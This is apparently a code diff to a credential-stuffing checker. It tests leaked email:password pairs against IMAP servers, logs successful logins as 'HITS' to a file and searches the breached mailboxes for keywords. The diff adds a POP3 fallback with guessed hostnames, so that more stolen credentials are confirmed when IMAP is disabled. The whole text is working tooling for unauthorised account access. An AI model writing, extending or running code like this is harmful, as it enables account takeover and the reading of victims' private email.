@@ -12,6 +12,7 @@ Usage:
 """
 
 import imaplib
+import poplib
 import ssl
 import sys
 import argparse
@@ -91,6 +92,42 @@ def imap_login(host: str, port: int, user: str, password: str, timeout: int):
         conn.logout()
         return True, None
     except imaplib.IMAP4.error as e:
+        return False, str(e)
+    except (ConnectionRefusedError, TimeoutError,
+            socket.timeout, socket.gaierror, OSError) as e:
+        return False, f"conn: {e}"
+    except Exception as e:
+        return False, f"err: {e}"
+
+
+def _is_imap_disabled(err: str) -> bool:
+    """True when IMAP is structurally disabled, not a wrong-password error."""
+    el = err.lower()
+    return ("disabled" in el or
+            "not enabled" in el or
+            "mechanism is not supported" in el)
+
+
+def _pop3_host(imap_host: str, domain: str) -> str | None:
+    """Derive a POP3 hostname from the IMAP hostname, or None to skip."""
+    if "office365" in imap_host or "outlook.com" in imap_host:
+        return None  # Microsoft disabled basic auth on POP3 too
+    if imap_host.startswith("imap."):
+        return "pop3." + imap_host[5:]
+    if imap_host.startswith("imap"):
+        return "pop3" + imap_host[4:]
+    return f"pop3.{domain}"
+
+
+def pop3_login(host: str, port: int, user: str, password: str, timeout: int):
+    """Try POP3 login. Returns (ok: bool, error: str | None)."""
+    try:
+        conn = poplib.POP3_SSL(host, port, context=_make_ssl_ctx(), timeout=timeout)
+        conn.user(user)
+        conn.pass_(password)
+        conn.quit()
+        return True, None
+    except poplib.error_proto as e:
         return False, str(e)
     except (ConnectionRefusedError, TimeoutError,
             socket.timeout, socket.gaierror, OSError) as e:
@@ -195,19 +232,30 @@ def check_account(line: str, idx: int, total: int,
     host, port = cfg["host"], cfg["port"]
     ok, err = imap_login(host, port, email, password, timeout)
 
+    # POP3 fallback when IMAP is structurally disabled (not a wrong password)
+    proto = "IMAP"
+    pop3_host_used = None
+    if not ok and _is_imap_disabled(err):
+        ph = _pop3_host(host, domain)
+        if ph:
+            pop3_ok, pop3_err = pop3_login(ph, 995, email, password, timeout)
+            if pop3_ok:
+                ok, err, proto, pop3_host_used = True, None, "POP3", ph
+
     if ok:
         with _print_lock:
             stats["hits"] += 1
             hits = stats["hits"]
 
+        used_host = pop3_host_used or host
         cprint(f"{prefix} {BOLD}{GREEN}HIT{RESET}  {email}  "
-               f"{DIM}[{host}]{RESET}  "
+               f"{DIM}[{used_host}|{proto}]{RESET}  "
                f"{GREEN}HITS: {hits}{RESET}")
         with _print_lock:
             hits_fh.write(f"{email}:{password}\n")
             hits_fh.flush()
 
-        if keywords and kw_files:
+        if keywords and kw_files and proto == "IMAP":
             found = search_keywords(host, port, email, password, keywords, timeout + 10)
             if found:
                 kw_counts: dict[str, int] = {}
